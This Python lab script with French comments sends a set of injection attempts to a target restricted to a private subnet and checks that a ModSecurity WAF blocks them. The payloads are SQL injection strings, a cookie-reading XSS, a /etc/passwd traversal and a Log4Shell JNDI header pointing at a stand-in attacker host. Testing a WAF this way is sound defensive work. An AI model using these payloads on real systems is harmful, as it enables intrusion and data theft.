#!/usr/bin/env python3
"""Démonstration : tentatives d'injection bloquées par le WAF (ModSecurity + OWASP CRS).

Scénario complémentaire du sujet : il ne s'agit pas de rendre le service indisponible,
mais de montrer qu'une tentative de compromission est bloquée (403), tracée et qualifiable
dans le SOC (Grafana > dashboard « Frontal et sécurité », règles ModSecurity déclenchées).

Garde-fou : la cible DOIT être dans 192.168.137.0/24 (CLAUDE.md). Données fictives.

Usage :
  python inject.py --target http://192.168.137.1
"""

import argparse
import sys
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from _target_guard import guard_or_exit  # noqa: E402

# Charges classiques, chacune censée déclencher une règle du Core Rule Set.
# Famille de règle attendue : 942xxx (SQLi), 941xxx (XSS), 930xxx (accès fichiers),
# 944xxx (Java/Log4Shell), 913xxx (scanners).
PAYLOADS = [
    ("Injection SQL (paramètre d'URL)", "GET", "/api/accounts/ACC-001?id=1' OR '1'='1", None),
    ("Injection SQL (UNION)", "GET", "/?q=1 UNION SELECT username, password FROM users--", None),
    ("Injection SQL (login)", "POST", "/api/auth/token",
     {"username": "admin' OR 1=1--", "password": "x"}),
    ("XSS réfléchi", "GET", "/?q=<script>alert(document.cookie)</script>", None),
    ("Accès à un fichier système", "GET", "/?file=../../../../etc/passwd", None),
    ("Log4Shell (en-tête User-Agent)", "GET", "/", None),  # en-tête ajouté plus bas
]


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Démo d'injections bloquées par le WAF (labo RESILIENCE-G16)")
    p.add_argument("--target", required=True, help="URL de base, ex. http://192.168.137.1")
    return p.parse_args()


def main() -> None:
    args = parse_args()
    guard_or_exit(args.target)
    base = args.target.rstrip("/")

    print(f"\n{'Tentative':<40} {'Méthode':<7} {'Code':<5} Verdict")
    print("-" * 72)
    blocked = 0
    with httpx.Client(timeout=10, verify=False) as client:
        for label, method, path, body in PAYLOADS:
            headers = {}
            if "Log4Shell" in label:
                headers["User-Agent"] = "${jndi:ldap://attacker.invalid/a}"
            try:
                if method == "POST":
                    r = client.post(base + path, json=body, headers=headers)
                else:
                    r = client.get(base + path, headers=headers)
                code = r.status_code
            except httpx.HTTPError as exc:
                print(f"{label:<40} {method:<7} ERR   {exc}")
                continue
            # 403 (ModSecurity) ou 400 (nginx, ex. traversée de répertoire) = bloqué
            verdict = "BLOQUÉ par le WAF" if code in (400, 403) else f"PASSÉ (!) -> {code}"
            if code in (400, 403):
                blocked += 1
            print(f"{label:<40} {method:<7} {code:<5} {verdict}")

    total = len(PAYLOADS)
    print("-" * 72)
    print(f"{blocked}/{total} tentatives bloquées par le WAF.")
    print("Détail des règles déclenchées : Grafana > « Resilience - Frontal et sécurité » "
          "> Règles ModSecurity déclenchées.")
    sys.exit(0 if blocked == total else 1)


if __name__ == "__main__":
    main()
